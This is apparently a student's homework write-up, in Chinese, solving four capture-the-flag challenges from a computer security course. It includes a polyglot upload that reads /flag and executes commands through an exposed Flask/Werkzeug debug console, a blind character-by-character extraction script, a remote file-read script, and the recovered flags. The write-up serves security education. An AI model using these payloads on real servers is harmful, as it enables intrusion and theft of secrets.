# HW0 writeups

Done: Yes
Due date: September 30, 2022
Subject: 計算機安全

## R11921A26

鄭煥榮

# ****[0x00] Let's meet at class****

題目已經給 hint，所以可以由 hint = keys[0] ^ …. keys[4] 推出 keys

由於每個 key 有 1000 種可能，所有可能都試要跑 1000^4 ( keys[4] 已知 )

所以我用建表的方式先把 keys 兩倆 XOR 的結果存下來

table01 = keys[0] ^ keys[1]

table23 = keys[2] ^ keys[3]

由於 XOR 特性，我們已知 keys[4]，可得 **hint ^ keys[4] = keys[0] ^ … keys[3]**

這樣我們只需 iter table01 (1000^2)，把式子簡化成  **hint ^ keys[4] ^ table01[] = table23[]**

左側運算出來的值只要看是否存在 table23 中即可快速找出 keys

再來把所有 keys 相乘取 mod p ， 再算出與 p 的乘法反元素 inv

最後 flag 為 ( env * enc )%p ， 用 long_to_bytes 可解碼出

**FLAG{enCrypTIon_wI7H_A_kEy_i5_N0t_secur3_7Hen_h0w_ab0u7_f1ve_Keys}**

 

```python
from output import *
from Crypto.Util.number import long_to_bytes
import time
import numpy as np
key4 = pow(4668,65537,p)
keytable0 = list()
keytable1 = list()
keytable2 = list()
keytable3 = list()
for rand0 in range(2,1000):
    keytable0.append(pow(rand0,65537,p))
print("keytable0 created")

for rand1 in range(1002,2000):
    keytable1.append(pow(rand1,65537,p))
print("keytable1 created")

for rand2 in range(2002,3000):
    keytable2.append(pow(rand2,65537,p))
print("keytable2 created")

for rand3 in range(3002,4000):
    keytable3.append(pow(rand3,65537,p))
print("keytable3 created")

xortable01 = dict()
i=-1
for key0 in keytable0:
    i+=1
    j=-1
    for key1 in keytable1:
        j+=1
        xortable01[(i,j)] = key0^key1
print("xortable01 created")

xortable23 = dict()

i=-1
for key2 in keytable2:
    i+=1
    j=-1
    for key3 in keytable3:
        j+=1
        xortable23[key2^key3] = (i,j)
print("xortable23 created")

hint = hint ^ key4
for key1,item in xortable01.items():
    tmp = hint^item
    start = time.time()
    if(tmp in xortable23):
        print("got it !!!!!!")
        print(key1,xortable23[tmp])
        end = time.time()
        print("執行時間：%f 秒" % (end - start))
        break
                
keys = []
keys.append(keytable0[589]%p)
keys.append(keytable1[514]%p)
keys.append(keytable2[847]%p)
keys.append(keytable3[449]%p)
keys.append(key4%p)

keymod = keys[0]
for i in range(1,5):
    keymod = keymod*keys[i]%p

y = pow(keymod, -1, p)
flag = y*enc%p
print(long_to_bytes(flag))
```

# ****[0x00] Welcome****

看 source code 可知本題是一個可讀檔並 print 的程式，程式裡沒有任何對 FLAG 變數運算的 func，所以 flag 極可能放在 server 端的 code

而且從 docker file 可以得知 source code 存放在 /home/chal/ 中

- **/home/chal/chal.c**
    
    此檔案中 FLAG 仍未被解碼，所以不是這個
    
- **/home/chal/chal**
    
    先找到 binary file 中 FLAG 存在的行數，最後估算出 offset 該設多少才能讀到 FLAG (時間不夠你從頭讀到尾)
    

最後用 xdd 成功讀到 FLAG : **flag{CS2022Fall_is_good}**.GCC: (Ubuntu 1 ..

```python
from pwn import *

output = open("ch", "wb")
r = remote('edu-ctf.zoolab.org',10001)
r.sendlineafter(b'5. seek\n','1')
r.sendline('/home/chal/chal')
r.sendlineafter(b'5. seek\n','2')
r.sendlineafter(b'5. seek\n','3')

output.write(r.recvuntil(b'1.')[2:-2])
for i in range(100,170):
    r.sendlineafter(b'5. seek\n','5')
    r.sendline(str(i*100+100))
    r.sendlineafter(b'5. seek\n','2')
    r.sendlineafter(b'5. seek\n','3')
    output.write(r.recvuntil(b'1.')[2:-2])
```

# [0x00] Under Development

這題透過 Pyscript 可知如果同時用 python 跟 js 印出第一個 flag 可以得到 flag1

看 Dockerfile 可知 flag2 只存在 flask 的 container，但是沒有與外網相連

所以唯一接觸 flag2 的方式只有透過 Pyscript 中執行 python 的指令 

搜尋 flask 相關漏洞可知如果把 Debug Mode 打開並且關閉 Debug Pin，在 flask app後面加入 /console 可以進入 python console

然而我們是無法直接用瀏覽器接觸 console ，在某篇 github 教學發現要透過 console 發出來的 js 中找到 secrect，這樣才能夠過發 request 的方式直接對 console 下指令讀取 flag

由於 Pyscript 只能回傳成功或失敗，我把 Flag 中會出現的字元一個一個比對找出整個 FLAG **f14sk_d36ug_m0d3_i5_r3adly_d4ng3r0u5**

## 上傳的檔案

```python
a = 1 // 1 ; b = '''

// Put your Javascript code here.
// Python will just assign it to a string variable

var fs = require('fs'); 
var data = fs.readFileSync('/flag');
// return(data)
// console.log(data.toString())
process.stdout.write(data.toString())

/* '''
# Put your Python code here. Javascript will ignore it
# because it's inside a comment

import urllib.request
import urllib.error

with urllib.request.urlopen('http://flask:5000/console') as response:
    secret = response.read()
secretnum = secret.decode('ascii').find('SECRET')
secret = secret[secretnum+10:secretnum+30].decode('ascii')
with urllib.request.urlopen('http://flask:5000/console?&__debugger__=yes&cmd=print(open(%27%2Fflag%27%2C%27r%27).read())&frm=0&s='+secret) as response:
    console = response.read()

ff = console.decode('ascii').split('\n')[1]
if(ff[]==):
	print('ddd')
with open('/flag', 'r') as f:
	data = f.read()
	print(data, end = '')

# */
```

## Solution

```python
import requests
from bs4 import BeautifulSoup

session = requests.session()

url = 'https://pyscript.ctf.zoolab.org/'

wordlist = ['}','a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z','0','1','2','3','4','5','6','7','8','9','_']
cnt=5
while(True):
	for i in wordlist:
		fin = open("sol", "rt")
		fout = open("search", "wt")
		for line in fin:
			fout.write(line.replace('if(ff[]==):', 'if(ff['+str(cnt)+']=='+"'"+i+"'):"))
		fin.close()
		fout.close()
		with open('search', 'r') as f:
			response = session.post(url, files = {'file': f})

		soup = BeautifulSoup(response.text, "html.parser")
		if(soup.text[0]=='F'):
			flag = i
			print(flag,end='')
			cnt+=1
			break
	if(flag=='}'):
		break
```

# [0x00] Nine

用 C# 逆向工程工具 ILSpy 打開 exe 可發現 Flag()

把 C# code 編譯可得 **FLAG{The_stone_is_not_fragile_anymore...}**

```csharp
using System;
					
public class Program
{
	
	public static void Main()
{
	byte[] array = Convert.FromBase64String("LwcvGwpuiPzT7+LY9PPo6eLpuiY7vTY6ejz2OH1pui5uDu6+LY5unpui+6uj14qmpuipqfo=".Replace("pui", "").Substring(1));
	for (int i = 0; i < array.Length; i++)
	{
		array[i] = (byte)(array[i] ^ 0x87u);
		char C = Convert.ToChar(array[i]);
		Console.Write(C);
	}
	
}
}
```